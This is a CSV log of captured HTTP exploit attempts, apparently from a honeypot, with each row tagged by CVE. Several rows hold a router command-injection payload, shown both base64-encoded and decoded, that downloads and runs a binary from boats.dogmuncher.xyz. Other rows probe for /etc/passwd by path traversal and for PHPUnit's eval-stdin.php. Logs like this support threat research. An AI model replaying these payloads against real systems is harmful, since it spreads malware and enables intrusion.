local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
223.31.122.235,89.190.156.170,40364,8080,CVE-2023-26801,2023-11-01T01:50:18,device:web:server:Apache,154,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '223.31.122.235:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,223.31.122.235:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
122.15.178.229,89.190.156.170,54650,8080,CVE-2023-26801,2023-11-01T01:19:31,device:web:server:Apache,203,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '122.15.178.229:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,122.15.178.229:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
202.191.227.214,89.190.156.170,58526,8080,CVE-2023-26801,2023-11-01T01:16:31,device:web:server:Apache,82,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '202.191.227.214:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,202.191.227.214:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
164.100.127.133,203.81.240.87,59891,80,CVE-2018-20062,2023-11-01T02:24:22,device:iot:Router:TP-LINK,80,AS17747,"{'method': 'GET', 'path': '/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00', 'headers': {'Host': '164.100.127.133', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'Accept-Encoding': 'gzip'}}",GET,/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",gzip,*/*,,,,,164.100.127.133,
10.182.96.185,203.81.240.87,18142,80,CVE-2018-19571,2023-11-01T02:09:33,device:iot:IPCamera:CPPLUS,362,AS17747,"{'method': 'GET', 'path': '/users/sign_in', 'headers': {'Host': '164.100.126.160', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36', 'Connection': 'close', 'Accept': '*/*', 'Accept-Language': 'en', 'Accept-Encoding': 'gzip'}}",GET,/users/sign_in,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",gzip,*/*,,,,,164.100.126.160,
203.175.185.93,45.95.147.236,33944,80,CVE-2017-9841,2023-11-01T02:15:17,device:iot:IPCamera:CISCO-WebCam,197,AS49870,"{'method': 'GET', 'path': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'headers': {'Accept': '*/*, */*, */*, */*', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive', 'Host': '203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80', 'Upgrade-Insecure-Requests': '1, 1, 1, 1', 'User-Agent': 'Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0'}}",GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0",,"*/*, */*, */*, */*",,,,,"203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80",
203.175.185.93,45.95.147.236,33944,80,CVE-2017-9841,2023-11-01T02:15:17,device:iot:IPCamera:CISCO-WebCam,197,AS49870,"{'method': 'GET', 'path': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'headers': {'Accept': '*/*, */*, */*, */*', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive', 'Host': '203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80', 'Upgrade-Insecure-Requests': '1, 1, 1, 1', 'User-Agent': 'Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0'}}",GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0",,"*/*, */*, */*, */*",,,,,"203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80",
14.139.76.68,45.95.147.236,54738,80,CVE-2017-9841,2023-11-01T02:16:42,device:iot:Printer:Canon,241,AS49870,"{'method': 'GET', 'path': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php/vendor/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/Util/PHP/eval-stdin.php/phpunit/phpunit/src/Util/PHP/eval-stdin.php/phpunit/phpunit/Util/PHP/eval-stdin.php/phpunit/src/Util/PHP/eval-stdin.php/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/Util/PHP/eval-stdin.php/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'headers': {'Accept': '*/*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive', 'Host': '14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80', 'Upgrade-Insecure-Requests': '1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1', 'User-Agent': 'Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0'}}",GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php/vendor/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/Util/PHP/eval-stdin.php/phpunit/phpunit/src/Util/PHP/eval-stdin.php/phpunit/phpunit/Util/PHP/eval-stdin.php/phpunit/src/Util/PHP/eval-stdin.php/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/Util/PHP/eval-stdin.php/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0",,"*/*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*",,,,,"14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80, 14.139.76.68:80",
103.178.162.13,89.190.156.170,38478,8080,CVE-2023-26801,2023-11-01T03:02:38,device:web:server:Apache,343,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.178.162.13:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.178.162.13:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
203.175.185.93,45.95.147.236,33944,80,CVE-2017-9841,2023-11-01T02:15:19,device:iot:IPCamera:CISCO-WebCam,197,AS49870,"{'method': 'GET', 'path': '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php/vendor/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/Util/PHP/eval-stdin.php/phpunit/phpunit/src/Util/PHP/eval-stdin.php/phpunit/phpunit/Util/PHP/eval-stdin.php/phpunit/src/Util/PHP/eval-stdin.php/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/Util/PHP/eval-stdin.php/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'headers': {'Accept': '*/*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive', 'Host': '203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80', 'Upgrade-Insecure-Requests': '1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1', 'User-Agent': 'Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0'}}",GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php/vendor/phpunit/src/Util/PHP/eval-stdin.php/vendor/phpunit/Util/PHP/eval-stdin.php/phpunit/phpunit/src/Util/PHP/eval-stdin.php/phpunit/phpunit/Util/PHP/eval-stdin.php/phpunit/src/Util/PHP/eval-stdin.php/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/phpunit/Util/PHP/eval-stdin.php/lib/phpunit/src/Util/PHP/eval-stdin.php/lib/phpunit/Util/PHP/eval-stdin.php/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0, Mozilla/5.0",,"*/*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*, */*",,,,,"203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80, 203.175.185.93:80",
